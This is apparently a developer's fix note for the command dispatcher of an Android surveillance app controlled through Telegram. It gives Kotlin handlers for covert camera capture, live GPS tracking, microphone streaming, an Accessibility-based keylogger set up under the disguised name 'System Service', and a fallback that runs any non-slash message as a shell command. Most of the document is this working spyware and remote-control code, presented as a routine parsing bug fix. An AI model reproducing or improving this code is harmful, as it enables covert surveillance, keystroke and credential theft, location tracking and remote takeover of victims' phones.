# CommandRegistry Fix - Multi-word Command Parsing

## Problem
Commands like `/photo front` were registered as single keys (e.g., `"photo front"`) in the commands map, but the `handle()` method split on the first space into `commandName="photo"` and `args="front"`, causing a mismatch - no `"photo"` key existed, so the command wasn't found.

## Solution

### 1. Removed Compound Command Registrations
Removed all multi-word command keys that were previously registered:
- `"photo front"`, `"photo back"`
- `"location start"`, `"location stop"`
- `"mic start"`, `"mic stop"`
- `"keylog start"`, `"keylog dump"`, `"keylog clear"`

### 2. Added Unified Command Handlers
Registered single-word command keys that inspect `args` to determine behavior:

**Photo Command:**
```kotlin
register("photo", "Take a photo | /photo front → selfie | /photo back → rear cam", "📷 Camera") { args ->
    val front = when (args.trim()) {
        "front" -> true
        "back", "" -> false
        else -> { telegram.sendText("Use: /photo front (selfie) or /photo back (rear)"); false }
    }
    camera.takePhoto(front = front)
}
```

**Location Command:**
```kotlin
register("location", "Get GPS location once | /location start → live tracking | /location stop → end", "📍 Location") { args ->
    when (args.trim()) {
        "start" -> location.startTracking()
        "stop" -> location.stopTracking()
        "" -> location.getOnce()
        else -> { telegram.sendText("Unknown location subcommand: $args"); location.getOnce() }
    }
}
```

**Mic Command:**
```kotlin
register("mic", "Start/stop live mic streaming | /mic start | /mic stop", "🎙️ Audio") { args ->
    when (args.trim()) {
        "start" -> audio.startStream()
        "stop" -> audio.stopStream()
        "" -> telegram.sendText("Usage: /mic start or /mic stop")
        else -> telegram.sendText("Unknown mic subcommand: $args")
    }
}
```

**Keylog Command:**
```kotlin
register("keylog", "Keylogger via Accessibility | /keylog start → enable | /keylog dump → view | /keylog clear → clear", "⌨️ Keylogger") { args ->
    when (args.trim()) {
        "start" -> telegram.sendText("Enable in: Settings → Accessibility → System Service")
        "dump" -> KeyloggerCapability.dumpLog(ctx, telegram)
        "clear" -> KeyloggerCapability.clearLog(ctx, telegram)
        "" -> telegram.sendText("Keylogger status: check Accessibility settings. Use /keylog dump to view, /keylog start for setup, /keylog clear to clear.")
        else -> telegram.sendText("Unknown keylog subcommand: $args")
    }
}
```

### 3. Command Matching Logic (handle method)
The `handle()` method now correctly dispatches:

```kotlin
fun handle(input: String): Boolean {
    val trimmedInput = input.trim()
    val parts = trimmedInput.split(" ", limit = 2)
    val command = parts[0]       // e.g., "photo" from "/photo front"
    val args = if (parts.size > 1) parts[1] else ""  // e.g., "front"

    // Step 1: Try exact match on command name in commands map
    val handler = commands[command]
    if (handler != null) {
        handler.execute(args)  // Passes "front" to photo handler
        return true
    }

    // Step 2: If not found and command starts with '/', strip '/' and try again
    if (command.startsWith("/")) {
        val trimmed = command.substring(1)
        val handler2 = commands[trimmed]
        if (handler2 != null) {
            handler2.execute(args)
            return true
        }
    }

    // Step 3: Bare command (no / prefix) → treat as shell command
    if (!command.startsWith("/") && command.isNotEmpty()) {
        ShellCapability(ctx, telegram).run(trimmedInput)
        return true
    }

    return false
}
```

## Flow Example

**User sends:** `/photo front`

1. `trimmedInput = "/photo front"`
2. `parts = ["/photo", "front"]` (split on first space, limit=2)
3. `command = "/photo"`
4. `args = "front"`
5. Try `commands["/photo"]` → not found (null)
6. Command starts with `/`, strip it: `trimmed = "photo"`
7. Try `commands["photo"]` → **FOUND** ✓
8. Execute: `photoHandler.execute("front")` → interprets front=true → takes selfie ✓

## Benefits

1. **Proper command separation:** Command name is always the first word, args are everything after
2. **No redundant registrations:** One command key handles multiple subcommands via args
3. **Backward compatible:** Simple commands like `/ping`, `/help` still work
4. **Clearer code:** Each command handler encapsulates its own subcommand logic
5. **Help text updated:** Reflects correct usage patterns